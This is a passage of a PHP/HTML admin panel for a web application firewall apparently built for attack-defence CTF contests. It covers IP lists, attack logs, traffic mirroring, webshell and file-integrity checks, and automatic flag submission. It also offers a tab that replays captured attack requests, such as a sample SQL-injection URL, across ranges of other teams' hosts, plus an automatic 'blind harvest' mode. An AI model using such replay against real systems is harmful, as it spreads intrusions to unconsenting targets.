<?php foreach ($cfg['blacklist'] as $bi): ?><span class="iptag"><?= $e($bi) ?><form method="post" action="<?= $e($self) ?>" style="display:inline"><input type="hidden" name="waf_key" value="<?= $e($key) ?>"><input type="hidden" name="act" value="rm_ip"><input type="hidden" name="list" value="bl"><input type="hidden" name="ip" value="<?= $e($bi) ?>"><button type="submit">&#xD7;</button></form></span><?php endforeach; ?>
</div>
<form method="post" action="<?= $e($self) ?>" style="display:flex;gap:6px"><input type="hidden" name="waf_key" value="<?= $e($key) ?>"><input type="hidden" name="act" value="add_bl"><input type="text" name="ip" placeholder="IP 地址" style="flex:1"><button type="submit" class="btn br">封禁</button></form>
</div>
</div>

<div class="sec"><div class="sec-title" style="color:#fbbf24">裁判机 IP <span style="color:var(--text2);font-weight:normal;font-size:10px">（自动识别）</span></div>
<div style="line-height:1.8">
<?php foreach ($cfg['checker_ips'] as $ci): ?><span class="iptag" style="border-color:#1e3a1e;background:#0a1a0a"><?= $e($ci) ?><form method="post" action="<?= $e($self) ?>" style="display:inline"><input type="hidden" name="waf_key" value="<?= $e($key) ?>"><input type="hidden" name="act" value="rm_ip"><input type="hidden" name="list" value="ck"><input type="hidden" name="ip" value="<?= $e($ci) ?>"><button type="submit">&#xD7;</button></form></span><?php endforeach; ?>
</div>
</div>
</div>
</div><!-- /ipmgmt -->

<!-- LOGS TAB -->
<div id="tab-logs" class="tab-panel">
<div class="sec"><div class="sec-title">攻击日志 <span style="color:var(--text2);font-weight:normal;font-size:10px">（最近 100 条）</span></div>
<div class="log-search"><input type="text" id="log-filter" placeholder="搜索 IP、规则、URI、Payload..." oninput="filterLogs(this.value)"></div>
<div style="overflow-x:auto"><table id="log-table">
<tr><th>时间</th><th>IP</th><th>规则</th><th>方法</th><th>URI</th><th>参数</th><th>Payload</th><th>Referer</th><th>POST</th><th>耗时(ms)</th></tr>
<?php foreach ($stats['recent'] as $ev): ?>
<tr>
<td style="white-space:nowrap"><?= date('m-d H:i:s', (isset($ev['ts']) ? $ev['ts'] : 0)) ?></td>
<td><?= $e((isset($ev['ip']) ? $ev['ip'] : '')) ?></td>
<td><span class="b b-<?= $e(isset($ev['rule']) ? $ev['rule'] : '') ?>"><?= $e((isset($ev['rule']) ? $ev['rule'] : '')) ?></span></td>
<td><?= $e((isset($ev['method']) ? $ev['method'] : '')) ?></td>
<td style="max-width:160px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="<?= $e(isset($ev['uri']) ? $ev['uri'] : '') ?>"><?= $e((isset($ev['uri']) ? $ev['uri'] : '')) ?></td>
<td><?= $e((isset($ev['param']) ? $ev['param'] : '')) ?></td>
<td style="max-width:220px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;color:#fbbf24" title="<?= $e(isset($ev['payload']) ? $ev['payload'] : '') ?>"><?= $e((isset($ev['payload']) ? $ev['payload'] : '')) ?></td>
<td style="max-width:120px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;color:var(--text2)" title="<?= $e(isset($ev['referer']) ? $ev['referer'] : '') ?>"><?= $e((isset($ev['referer']) ? $ev['referer'] : '-')) ?></td>
<td style="max-width:120px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;color:#7dd3fc" title="<?= $e(isset($ev['post']) ? $ev['post'] : '') ?>"><?= $e((isset($ev['post']) ? $ev['post'] : '-')) ?></td>
<td style="color:var(--text2)"><?= isset($ev['ms']) ? $ev['ms'] : '-' ?></td>
</tr><?php endforeach; ?>
</table></div></div>
</div><!-- /logs -->

<!-- FORWARD TAB -->
<div id="tab-forward" class="tab-panel">
<div class="sec"><div class="sec-title">流量转发（镜像）</div>
<div style="color:var(--text2);font-size:12px;margin-bottom:14px;line-height:1.8">
将每个请求异步镜像转发到指定目标，不影响主请求响应速度。<br>
支持 IP 段过滤：只转发来自特定 IP 段的请求（可用于只转发攻击者流量）。<br>
<span style="color:#fbbf24">格式：每行一个目标，格式为 <code style="background:#1e2d4a;padding:1px 5px;border-radius:3px">主机[:端口] [IP段]</code></span><br>
<span style="color:var(--text2);font-size:11px">
示例：<br>
<code style="color:#7dd3fc">192.168.1.100</code> — 转发到 192.168.1.100:80，不限来源<br>
<code style="color:#7dd3fc">10.0.0.5:8080 192.168.12.0/24</code> — 转发到 8080 端口，且只转发特定 IP 段的请求<br>
<code style="color:#7dd3fc">honeypot.local:80 10.10.1.1-10.10.2.255</code> — IP 范围格式<br>
<code style="color:#f97316">192.168.1.1:8801-8820</code> — 批量转发到同一 IP 的多个端口（切勿设置过大范围，以免阻塞 PHP 进程）
</span>
</div>
<form method="post" action="<?= $e($self) ?>">
  <input type="hidden" name="waf_key" value="<?= $e($key) ?>">
  <input type="hidden" name="act" value="save_forward">
  <div style="margin-bottom:12px">
    <div style="color:var(--text2);font-size:11px;margin-bottom:6px">转发目标列表（每行一个）</div>
    <?php
    $fwd_raw = '';
    foreach ((isset($cfg['forward_targets']) ? $cfg['forward_targets'] : array()) as $t) {
        $line = (isset($t['host']) ? $t['host'] : '') . ':' . (isset($t['port']) ? $t['port'] : 80);
        if (!empty($t['cidr'])) $line .= ' ' . $t['cidr'];
        $fwd_raw .= $line . "\n";
    }
    ?>
    <textarea name="forward_targets_raw" rows="6" placeholder="192.168.1.100:80&#10;10.0.0.5:8080 192.168.12.0/24&#10;honeypot.local:80 10.10.1.1-10.10.2.255"><?= $e(trim($fwd_raw)) ?></textarea>
  </div>
  <div style="display:flex;align-items:center;gap:10px;margin-bottom:14px">
    <label class="toggle-switch">
      <input type="checkbox" name="forward_enabled" value="1" <?= !empty($cfg['forward_enabled']) ? 'checked' : '' ?>>
      <span class="toggle-slider"></span>
    </label>
    <span style="font-size:12px">启用流量转发</span>
    <span style="color:var(--text2);font-size:11px">（当前：<?= !empty($cfg['forward_enabled']) ? '<span style="color:var(--green)">开启</span>' : '<span style="color:var(--red)">关闭</span>' ?>）</span>
  </div>
  <button type="submit" class="btn bo">保存设置</button>
</form>
</div>
</div><!-- /forward -->

<!-- INTEGRITY TAB -->
<div id="tab-integrity" class="tab-panel">
<?php
$int_db = (isset($cfg['integrity_db']) ? $cfg['integrity_db'] : (pwaf_datadir($cfg) . '/.pwaf_int'));
$int_stored = file_exists($int_db) ? (json_decode(@file_get_contents($int_db), true) ?: []) : [];
$int_base = (isset($int_stored['b']) ? $int_stored['b'] : []);
$int_ts   = (isset($int_stored['ts']) ? $int_stored['ts'] : 0);
$int_events = [];
$lp_int = (isset($cfg['log']) ? $cfg['log'] : '');
if (file_exists($lp_int)) {
    foreach (array_slice((array)@file($lp_int, FILE_IGNORE_NEW_LINES|FILE_SKIP_EMPTY_LINES), -5000) as $line) {
        $ev = json_decode($line, true);
        if (!is_array($ev)) continue;
        if (strpos((isset($ev['rule']) ? $ev['rule'] : ''), 'integrity_') === 0 || strpos((isset($ev['rule']) ? $ev['rule'] : ''), 'watcher_') === 0) {
            $int_events[] = $ev;
        }
    }
}
$int_events = array_reverse(array_slice($int_events, -200));
?>
<div class="stats-grid" style="margin-bottom:16px">
  <div class="stat-card <?= count($int_events) > 0 ? 'c-alert' : 'c-green' ?>">
    <div class="stat-label">完整性告警</div>
    <div class="stat-val" style="color:<?= count($int_events) > 0 ? 'var(--red)' : 'var(--green)' ?>"><?= count($int_events) ?></div>
  </div>
  <div class="stat-card c-cyan">
    <div class="stat-label">基线文件数</div>
    <div class="stat-val cyan"><?= count($int_base) ?></div>
  </div>
  <div class="stat-card c-orange">
    <div class="stat-label">基线更新时间</div>
    <div class="stat-val" style="font-size:14px;color:var(--accent)"><?= $int_ts ? date('m-d H:i', $int_ts) : '未建立' ?></div>
  </div>
</div>

<div class="sec"><div class="sec-title">操作</div>
<div class="ctrl-bar">
<form method="post" action="<?= $e($self) ?>">
  <input type="hidden" name="waf_key" value="<?= $e($key) ?>">
  <input type="hidden" name="act" value="update_baseline">
  <button type="submit" class="btn bo" onclick="return confirm('更新基线将以当前文件状态为准，确认？')">&#x21BB; 更新基线</button>
</form>
<div style="color:var(--text2);font-size:11px;line-height:1.7">
  基线记录所有 PHP/配置/脚本/数据库文件的 SHA256 哈希。<br>
  每 5 秒自动检查一次，发现新增或篡改文件时记录告警。<br>
  <span style="color:#fbbf24">监控范围：.php .ini .conf .sh .py .sql .xml .env .key .pem 等</span>
</div>
</div></div>

<?php if (!empty($int_events)): ?>
<div class="sec"><div class="sec-title" style="color:var(--red)">告警记录 <span style="color:var(--text2);font-weight:normal;font-size:10px">（最近 200 条）</span></div>
<div style="overflow-x:auto"><table>
<tr><th>时间</th><th>类型</th><th>文件路径</th><th>SHA256</th></tr>
<?php foreach ($int_events as $ev):
    $rule = (isset($ev['rule']) ? $ev['rule'] : '');
    $color = $rule === 'integrity_new' ? '#f97316' : (strpos($rule, 'watcher_') === 0 ? '#f87171' : '#fbbf24');
    $labels = ['integrity_new'=>'新增文件','integrity_modified'=>'文件篡改',
               'watcher_shell'=>'不死马查杀','watcher_restore'=>'文件恢复',
               'watcher_tamper'=>'篡改恢复','watcher_deleted'=>'文件删除'];
    $label = (isset($labels[$rule]) ? $labels[$rule] : $rule);
?>
<tr>
  <td style="white-space:nowrap"><?= $e((isset($ev['dt']) ? $ev['dt'] : date('Y-m-d H:i:s', (isset($ev['ts']) ? $ev['ts'] : 0)))) ?></td>
  <td><span class="b" style="background:<?= $color ?>;color:#000"><?= $e($label) ?></span></td>
  <td style="color:#7dd3fc;word-break:break-all;max-width:400px"><?= $e((isset($ev['uri']) ? $ev['uri'] : '')) ?></td>
  <td style="color:var(--text2);font-size:10px;max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="<?= $e(isset($ev['payload']) ? $ev['payload'] : '') ?>"><?= $e(substr((isset($ev['payload']) ? $ev['payload'] : ''),0,16)) ?>...</td>
</tr>
<?php endforeach; ?>
</table></div></div>
<?php else: ?>
<div class="sec"><div style="color:var(--green);text-align:center;padding:20px;font-size:13px">&#x2713; 未检测到文件篡改或新增文件</div></div>
<?php endif; ?>

<?php if (!empty($int_base)): ?>
<div class="sec"><div class="sec-title">基线文件列表 <span style="color:var(--text2);font-weight:normal;font-size:10px">（<?= count($int_base) ?> 个文件）</span></div>
<div style="max-height:300px;overflow-y:auto">
<table><tr><th>文件路径</th><th>SHA256</th></tr>
<?php foreach ($int_base as $fp => $fh): ?>
<tr>
  <td style="color:#7dd3fc;font-size:11px"><?= $e($fp) ?></td>
  <td style="color:var(--text2);font-size:10px"><?= $e(substr($fh,0,16)) ?>...</td>
</tr>
<?php endforeach; ?>
</table></div></div>
<?php endif; ?>
</div><!-- /integrity -->

<!-- FLAG SUBMIT TAB -->
<div id="tab-flagsub" class="tab-panel">
<div class="sec"><div class="sec-title">自动提交 Flag</div>
<div style="color:var(--text2);font-size:12px;margin-bottom:14px;line-height:1.7">
当 WAF 的响应 Hook 捕获到 flag 时，自动向平台提交。<br>
在下方粘贴从 Burp Suite / Yakit 截获的提交数据包，将 flag 值替换为 <code style="color:#f97316;background:#1e2d4a;padding:1px 5px;border-radius:3px">${flag}</code>。
</div>
<form method="post" action="<?= $e($self) ?>">
  <input type="hidden" name="waf_key" value="<?= $e($key) ?>">
  <input type="hidden" name="act" value="save_flagsub">

  <div style="margin-bottom:14px">
    <div style="color:var(--text2);font-size:11px;margin-bottom:6px">Flag 正则提取匹配规则（可在此基础上修改）</div>
    <input type="text" name="flagsub_regex" value="<?= $e(!empty($cfg['flagsub_regex']) ? $cfg['flagsub_regex'] : 'flag\{[A-Za-z0-9_\-\.!@#$%^&*()+=]{1,100}\}') ?>" style="width:100%;max-width:480px">
  </div>

  <div style="margin-bottom:14px">
    <div style="color:var(--text2);font-size:11px;margin-bottom:6px">HTTP 请求模板（从 Burp/Yakit 复制原始数据包，flag 处填 <code style="color:#f97316">${flag}</code>）</div>
    <textarea name="flagsub_template" rows="14" placeholder="POST /submit HTTP/1.1&#10;Host: ctf-platform.example.com&#10;Content-Type: application/x-www-form-urlencoded&#10;Cookie: session=your_session_here&#10;&#10;token=your_token&flag=${flag}"><?= $e((isset($cfg['flagsub_template']) ? $cfg['flagsub_template'] : '')) ?></textarea>
    <div style="color:var(--text2);font-size:10px;margin-top:4px">格式：第一行 METHOD /path HTTP/1.1，然后请求头，空行后是请求体。Host 头必须填写。</div>
  </div>

  <div style="display:flex;align-items:center;gap:10px;margin-bottom:14px">
    <label class="toggle-switch">
      <input type="checkbox" name="flagsub_enabled" value="1" <?= !empty($cfg['flagsub_enabled']) ? 'checked' : '' ?>>
      <span class="toggle-slider"></span>
    </label>
    <span style="font-size:12px">启用自动提交</span>
    <span class="status-text" style="color:var(--text2);font-size:11px">（当前：<?= !empty($cfg['flagsub_enabled']) ? '<span style="color:var(--green)">开启</span>' : '<span style="color:var(--red)">关闭</span>' ?>）</span>
  </div>
  <button type="submit" class="btn bo">保存设置</button>
</form>
</div>

<?php
$fl = preg_replace('/\.([^.]+)$/', '_flagsub.$1', (isset($cfg['log']) ? $cfg['log'] : (pwaf_datadir($cfg) . '/.pwaf_log')));
if (file_exists($fl)):
    $lines = array_filter(array_slice(file($fl), -20));
?>
<div class="sec"><div class="sec-title">最近提交记录</div>
<table><tr><th>时间</th><th>Flag</th><th>提交地址</th><th>响应</th></tr>
<?php foreach (array_reverse(array_values($lines)) as $line):
    $ev = json_decode($line, true); if (!$ev) continue; ?>
<tr>
  <td style="white-space:nowrap"><?= $e((isset($ev['dt']) ? $ev['dt'] : '')) ?></td>
  <td style="color:#f97316"><?= $e((isset($ev['flag']) ? $ev['flag'] : '')) ?></td>
  <td style="color:var(--text2)"><?= $e((isset($ev['url']) ? $ev['url'] : '')) ?></td>
  <td style="color:var(--green);max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap"><?= $e((isset($ev['resp']) ? $ev['resp'] : '')) ?></td>
</tr>
<?php endforeach; ?>
</table></div>
<?php endif; ?>
</div>
<!-- /flagsub -->

<!-- REPLAY TAB -->
<div id="tab-replay" class="tab-panel">
  <div class="sec">
    <div class="sec-title">流量重放 / 广播攻击</div>
    <div style="color:var(--text2);font-size:12px;margin-bottom:14px;line-height:1.8">
      将捕获的攻击流量重放到其他队伍的靶机，自动获取 flag。<br>
      <span style="color:#fbbf24">工作流程：</span>从攻击日志中选择一条请求 → 修改目标 IP 范围 → 广播发送 → 自动提取 flag → 提交到平台<br>
      <span style="color:var(--text2);font-size:11px">注意：请确保自动提交 Flag 已配置并开启。</span>
    </div>
  </div> <div class="sec" style="border:1px solid var(--border)">
    <div class="sec-title">手动重放</div>
    <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:14px">
      <div>
        <div style="color:var(--text2);font-size:11px;margin-bottom:6px">HTTP 请求模板</div>
        <textarea id="replay-raw" rows="12" placeholder="GET /vuln.php?id=1+UNION+SELECT+1,2,3-- HTTP/1.1&#10;Host: {target}&#10;User-Agent: Mozilla/5.0&#10;&#10;"></textarea>
        <div style="color:var(--text2);font-size:10px;margin-top:4px">使用 <code style="color:#f97316">{target}</code> 作为目标主机占位符</div>
      </div>
      <div>
        <div style="color:var(--text2);font-size:11px;margin-bottom:6px">目标 IP 与 端口范围</div>
        <div style="margin-bottom:8px">
          <input type="text" id="replay-ip-start" placeholder="192.168.1.1" style="width:120px"> —
          <input type="text" id="replay-ip-end" placeholder="192.168.1.20" style="width:120px">
        </div>
        <div style="margin-bottom:8px">
          <span style="color:var(--text2);font-size:11px;margin-right:6px">端口:</span>
          <input type="text" id="replay-port-start" placeholder="80" style="width:60px" value="80"> —
          <input type="text" id="replay-port-end" placeholder="80" style="width:60px" value="80">
        </div>
        <div style="margin-bottom:8px">
          <div style="color:var(--text2);font-size:10px;margin-bottom:4px">跳过自身 IP</div>
          <label style="font-size:12px;display:flex;align-items:center;gap:6px">
            <input type="checkbox" id="replay-skip-self" checked> 跳过 <?= $e($ip) ?>
          </label>
        </div>
        <div style="margin-bottom:8px">
          <div style="color:var(--text2);font-size:10px;margin-bottom:4px">Flag 提取正则</div>
          <input type="text" id="replay-flag-regex" value="flag\{[A-Za-z0-9_\-]{1,100}\}" style="width:100%">
        </div>
        <div style="margin-bottom:12px">
          <button type="button" class="btn bo" onclick="pwafReplayBroadcast()" id="replay-btn">&#x25B6; 开始广播</button>
          <button type="button" class="btn bs" onclick="pwafReplayStop()" id="replay-stop-btn" style="display:none">&#x25A0; 停止</button>
          <span id="replay-status" style="color:var(--text2);font-size:11px;margin-left:10px"></span>
        </div>
        <div style="color:var(--text2);font-size:10px">
          结果：<span id="replay-sent" style="color:var(--cyan)">0</span> 发送 /
          <span id="replay-flags" style="color:var(--green)">0</span> 提取到 flag /
          <span id="replay-errors" style="color:var(--red)">0</span> 失败
        </div>
      </div>
    </div>
  </div>

  <div class="sec" style="border:1px solid var(--border)">
    <div class="sec-title" style="color:var(--green)">提取到的 Flag</div>
    <div id="replay-flag-list" style="max-height:200px;overflow-y:auto;font-size:12px;color:var(--green)">
      <div style="color:var(--text2);font-size:11px">广播完成后，提取到的 flag 会显示在这里</div>
    </div>
  </div>

  <div class="sec" style="border:1px solid var(--border)">
    <div class="sec-title">从攻击日志加载（点击加载到模板）</div>
    <div style="max-height:250px;overflow-y:auto">
      <table id="replay-log-table">
        <tr><th>时间</th><th>规则</th><th>方法</th><th>URI</th><th>Payload</th><th>操作</th></tr>
        <?php foreach (array_slice($stats['recent'], 0, 30) as $ev):
            if (((isset($ev['action']) ? $ev['action'] : '')) !== 'block') continue;
            $rmethod = (isset($ev['method']) ? $ev['method'] : 'GET');
            $ruri = (isset($ev['uri']) ? $ev['uri'] : '/');
            $rpost = (isset($ev['post']) ? $ev['post'] : '');
            $replay_raw = $rmethod . ' ' . $ruri . " HTTP/1.1\nHost: {target}\nUser-Agent: " . ((isset($ev['ua']) ? $ev['ua'] : 'Mozilla/5.0'));
            if ($rmethod === 'POST' && $rpost) {
                $replay_raw .= "\nContent-Type: application/x-www-form-urlencoded\n\n" . $rpost;
            }
        ?>
        <tr>
          <td style="white-space:nowrap"><?= date('H:i:s', (isset($ev['ts']) ? $ev['ts'] : 0)) ?></td>
          <td><span class="b b-<?= $e(isset($ev['rule']) ? $ev['rule'] : '') ?>"><?= $e((isset($ev['rule']) ? $ev['rule'] : '')) ?></span></td>
          <td><?= $e($rmethod) ?></td>
          <td style="max-width:150px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="<?= $e($ruri) ?>"><?= $e($ruri) ?></td>
          <td style="max-width:150px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;color:#fbbf24" title="<?= $e(isset($ev['payload']) ? $ev['payload'] : '') ?>"><?= $e(substr((isset($ev['payload']) ? $ev['payload'] : ''),0,40)) ?></td>
          <td><button type="button" class="btn bs" style="padding:2px 6px;font-size:10px" onclick="pwafLoadReplay(this)" data-raw="<?= $e(base64_encode($replay_raw)) ?>">加载</button></td>
        </tr>
        <?php endforeach; ?>
      </table>
    </div>
  </div>
</div>
<div id="tab-autoreap" class="tab-panel">
  <div class="sec">
    <div class="sec-title">全流量审计与盲打收割</div>
    <div style="color:var(--text2);font-size:12px;margin-bottom:14px;line-height:1.8">
      此处实时监控到达本服务器的<b>所有 HTTP 请求</b>（包含被拦截的攻击与放行的正常流量）。点击<code style="color:var(--accent);">详情</code>可查看完整请求报文。<br>
      
      <details style="background:#060a14;border:1px solid var(--border);border-radius:6px;padding:8px 12px;margin-top:8px;outline:none;" <?= !empty($cfg['autoreap_enabled']) ? 'open' : '' ?>>
        <summary style="cursor:pointer;color:#f97316;font-weight:bold;outline:none;user-select:none;">&#x25B6; 展开高级功能：全流量自动盲打收割配置</summary>
        <form method="post" action="<?= $e($self) ?>">
          <input type="hidden" name="waf_key" value="<?= $e($key) ?>">
          <input type="hidden" name="act" value="save_autoreap">
          <div style="margin-top:12px;display:grid;grid-template-columns:1fr 1fr;gap:20px;border-top:1px dashed var(--border);padding-top:12px;">
            <div>
              <div style="color:var(--text2);font-size:11px;margin-bottom:6px">盲打目标 IP 与端口范围</div>
              <div style="margin-bottom:8px">
                <input type="text" name="autoreap_ip_start" value="<?= $e(isset($cfg['autoreap_ip_start']) ? $cfg['autoreap_ip_start'] : '') ?>" placeholder="192.168.1.1" style="width:130px"> — 
                <input type="text" name="autoreap_ip_end" value="<?= $e(isset($cfg['autoreap_ip_end']) ? $cfg['autoreap_ip_end'] : '') ?>" placeholder="192.168.1.20" style="width:130px">
              </div>
              <div style="margin-bottom:8px">
                <span style="color:var(--text2);font-size:11px;margin-right:6px">端口:</span>
                <input type="text" name="autoreap_port_start" value="<?= $e(isset($cfg['autoreap_port_start']) ? $cfg['autoreap_port_start'] : '80') ?>" placeholder="80" style="width:60px"> — 
                <input type="text" name="autoreap_port_end" value="<?= $e(isset($cfg['autoreap_port_end']) ? $cfg['autoreap_port_end'] : '80') ?>" placeholder="80" style="width:60px">
              </div>
              <button type="submit" class="btn bo" style="margin-top:6px;padding:4px 10px;">保存盲打配置</button>
            </div>
            <div style="display:flex;flex-direction:column;justify-content:center">
              <div style="margin-bottom:12px;display:flex;align-items:center;">
                <label class="toggle-switch" style="margin-right:10px">
                  <input type="checkbox" name="autoreap_enabled" value="1" <?= !empty($cfg['autoreap_enabled']) ? 'checked' : '' ?> onchange="toggleAutoReapUI(this.checked)">
                  <span class="toggle-slider"></span>
                </label>
                <span id="auto-reap-status" style="font-weight:bold;color:var(--text2)">自动盲打: <?= !empty($cfg['autoreap_enabled']) ? '<span style="color:var(--red)">运行中...</span>' : '已关闭' ?></span>
              </div>
              <div style="color:var(--text2);font-size:10px;line-height:1.8;background:#0a0e1a;padding:8px;border-radius:4px;border:1px solid var(--border)">
                待处理队列: <span id="auto-queue-count" style="color:var(--cyan);font-weight:bold;">0</span><br>
                已广播请求: <span id="auto-sent-count" style="color:var(--accent);font-weight:bold;">0</span><br>
                捕获并提交 Flag: <span id="auto-flag-count" style="color:var(--green);font-weight:bold;">0</span>
              </div>
            </div>
          </div>
        </form>
      </details>
    </div>

    <div style="border:1px solid var(--border);border-radius:6px;background:#0a0e1a;">
      <div style="padding:10px 16px;border-bottom:1px solid var(--border);display:flex;gap:16px;align-items:center;background:#0f1629;border-radius:6px 6px 0 0;flex-wrap:wrap;">
        <span style="color:var(--text2);font-size:11px;font-weight:bold;">视图过滤:</span>
        <select id="ft-filter-type" onchange="ftPage=1; renderFullTraffic()" style="background:#060a14;border:1px solid var(--border);color:var(--text);padding:4px 8px;border-radius:4px;font-size:11px;outline:none;">
          <option value="all">全部流量</option>
          <option value="pass">仅看放行</option>
          <option value="block">仅看拦截</option>
        </select>
        <label style="font-size:11px;display:flex;align-items:center;gap:4px;cursor:pointer;color:var(--text);">
          <input type="checkbox" id="filter-self-ip" checked onchange="renderFullTraffic()"> 隐藏本机 IP
        </label>
        <label style="font-size:11px;display:flex;align-items:center;gap:4px;cursor:pointer;color:var(--text);">
          <input type="checkbox" id="filter-ajax" checked onchange="renderFullTraffic()"> 隐藏 WAF 通讯
        </label>
        
        <div style="margin-left:auto;display:flex;align-items:center;gap:10px;">
          <button type="button" class="btn bs" style="padding:2px 8px;font-size:10px" onclick="ftChangePage(-1)">&#x25C0;</button>
          <span style="font-size:11px;color:var(--text2)" id="ft-page-info">1 / 1</span>
          <button type="button" class="btn bs" style="padding:2px 8px;font-size:10px" onclick="ftChangePage(1)">&#x25B6;</button>
        </div>
      </div>

      <table id="full-traffic-table" style="table-layout:fixed;width:100%;">
        <thead>
          <tr>
            <th style="width:70px">时间</th>
            <th style="width:60px">状态</th>
            <th style="width:150px">源 IP</th>
            <th style="width:60px">方法</th>
            <th>URI</th>
            <th style="width:70px;text-align:center;">操作</th>
          </tr>
        </thead>
        <tbody id="ft-tbody">
          </tbody>
      </table>
    </div>
  </div>
</div>

</div><!-- /main -->
</div><!-- /layout -->
<script>
// function showTab(id,el){
//   document.querySelectorAll('.tab-panel').forEach(function(p){p.classList.remove('active')});
//   document.querySelectorAll('.nav-item').forEach(function(n){n.classList.remove('active')});
//   document.getElementById('tab-'+id).classList.add('active');
//   el.classList.add('active');
// }
// ── 核心 UI 状态管理 (Tab 与滚动) ───────────────────────────────────────────
function showTab(id, el) {
  document.querySelectorAll('.tab-panel').forEach(function(p){ p.classList.remove('active'); });
  document.querySelectorAll('.nav-item').forEach(function(n){ n.classList.remove('active'); });
  
  var targetPanel = document.getElementById('tab-' + id);
  if (targetPanel) targetPanel.classList.add('active');
  
  if (el) {
    el.classList.add('active');
  } else {
    document.querySelectorAll('.nav-item').forEach(function(n) {
      if (n.getAttribute('onclick') && n.getAttribute('onclick').includes("'" + id + "'")) {
        n.classList.add('active');
      }
    });
  }
  localStorage.setItem('pwaf_active_tab', id);
  // 打开"全流量/盲打"页时立即渲染一次，避免空表格干等 2 秒轮询
  if (id === 'autoreap' && typeof renderFullTraffic === 'function') {
    try { renderFullTraffic(); } catch(e) {}
  }
}

document.addEventListener('DOMContentLoaded', function() {
  // 1. 无缝恢复 Tab 和滚动条
  var activeTab = localStorage.getItem('pwaf_active_tab');
  if (activeTab && document.getElementById('tab-' + activeTab)) {
    showTab(activeTab, null);
  }
  var scrollPos = localStorage.getItem('pwaf_scroll_pos');
  var mainEl = document.querySelector('.main');
  if (scrollPos && mainEl) {
    mainEl.scrollTop = parseInt(scrollPos);
  }

  // 2. 表单全局 AJAX 劫持 (彻底消除提交引起的页面刷新与 Tab 丢失)
  document.querySelectorAll('form').forEach(function(form) {
    var actInput = form.querySelector('input[name="act"]');
    if (!actInput) return;
    
    var act = actInput.value;
    // var isConfigForm = ['save_forward', 'save_flagsub', 'fake_flag', 'save_openbasedir'].includes(act);
    var isConfigForm = ['save_forward', 'save_flagsub', 'fake_flag', 'save_openbasedir', 'save_autoreap'].includes(act);
    var isRuleToggle = ['toggle_rule', 'toggle_custom_rule'].includes(act);
    
    if (isConfigForm || isRuleToggle) {
      // 抹除原本 HTML 中可能残余的内联提交，统一由事件驱动
      var checkbox = form.querySelector('input[type="checkbox"]');
      if (isRuleToggle && checkbox) {
        checkbox.removeAttribute('onchange');
        checkbox.addEventListener('change', function() {
          form.dispatchEvent(new Event('submit', { cancelable: true, bubbles: true }));
        });
      }

      form.addEventListener('submit', function(e) {
        e.preventDefault(); // 核心：拦截原生 POST 跳转
        var formData = new FormData(this);
        
        fetch(this.action, {
          method: 'POST',
          body: formData,
          headers: { 'X-Requested-With': 'XMLHttpRequest' }
        }).then(function(res) {
          if (res.ok) {
            showToast('[保存成功]', '后端配置已更新生效', false);
            // UI 联动：自动更新旁边的 (当前：开启/关闭) 文本，消除错觉
            if (act === 'save_forward' || act === 'save_flagsub') {
              var isEnabled = formData.get(act === 'save_forward' ? 'forward_enabled' : 'flagsub_enabled') === '1';
              var statusSpan = form.querySelector('.status-text');
              if (statusSpan) {
                statusSpan.innerHTML = '（当前：' + (isEnabled ? '<span style="color:var(--green)">开启</span>' : '<span style="color:var(--red)">关闭</span>') + '）';
              }
            }
          } else {
            showToast('[保存失败]', '服务器响应异常', true);
            if (isRuleToggle && checkbox) checkbox.checked = !checkbox.checked; // 失败则回退UI
          }
        }).catch(function() {
          showToast('[网络异常]', '无法连接到 WAF 服务', true);
          if (isRuleToggle && checkbox) checkbox.checked = !checkbox.checked;
        });
      });
    }
  });

  // 3. 流量转发与自动提交的开关，实现“即点即存”
  // document.querySelectorAll('input[name="forward_enabled"], input[name="flagsub_enabled"]').forEach(function(toggle) {
  document.querySelectorAll('input[name="forward_enabled"], input[name="flagsub_enabled"], input[name="autoreap_enabled"]').forEach(function(toggle) {
    toggle.addEventListener('change', function() {
      this.closest('form').dispatchEvent(new Event('submit', { cancelable: true, bubbles: true }));
    });
  });
});

window.addEventListener('beforeunload', function() {
  var mainArea = document.querySelector('.main');
  if (mainArea) localStorage.setItem('pwaf_scroll_pos', mainArea.scrollTop);
});

// UI 辅助
function filterLogs(q){
  q=q.toLowerCase();
  var rows=document.querySelectorAll('#log-table tr');
  for(var i=1;i<rows.length;i++){ rows[i].style.display=rows[i].textContent.toLowerCase().indexOf(q)>-1?'':'none'; }
}
function toggleDetail(id){
  var el=document.getElementById(id);
  if(!el) return;
  var btn=el.previousElementSibling.querySelector('.rule-expand-btn');
  if(el.classList.contains('open')){el.classList.remove('open');if(btn)btn.textContent='▸ 详情';}
  else{el.classList.add('open');if(btn)btn.textContent='▾ 收起';}
}
// (toggleTrafficDetail 的完整实现在下方——保留会维护 ftExpandedIds 的那个版本)

// ── 音效与通知引擎 ──────────────────────────────────────────────────────────
var _pwaf_last_count = <?= $stats['total'] ?>;
var _pwaf_notify_perm = false;

// 全局 HTML 转义：面板要展示攻击者可控的 URI/payload/Host/flag，务必转义后再插入 DOM，
// 否则攻击者用一个带 <img onerror> 的请求即可在管理员浏览器里执行脚本（面板自身 XSS）。
function pwafEsc(s){ return String(s==null?'':s).replace(/[&<>'"]/g, function(c){ return {'&':'&amp;','<':'&lt;','>':'&gt;',"'":'&#39;','"':'&quot;'}[c]; }); }

if ('Notification' in window && Notification.permission === 'granted') { _pwaf_notify_perm = true; }
// 浏览器要求告警音(AudioContext)和通知授权必须由用户手势触发，否则被静默挂起/拒绝。
// 因此在首次点击/键盘交互时才创建并恢复共享音频上下文、申请通知权限。
var _pwaf_actx = null;
function _pwafInitAudio() {
  try { if (!_pwaf_actx) _pwaf_actx = new (window.AudioContext || window.webkitAudioContext)();
        if (_pwaf_actx.state === 'suspended') _pwaf_actx.resume(); } catch(e) {}
  if ('Notification' in window && Notification.permission === 'default') {
    try { Notification.requestPermission().then(function(p){ _pwaf_notify_perm = (p === 'granted'); }); } catch(e) {}
  }
}
window.addEventListener('click', _pwafInitAudio, { once: true });
window.addEventListener('keydown', _pwafInitAudio, { once: true });

var style = document.createElement('style');
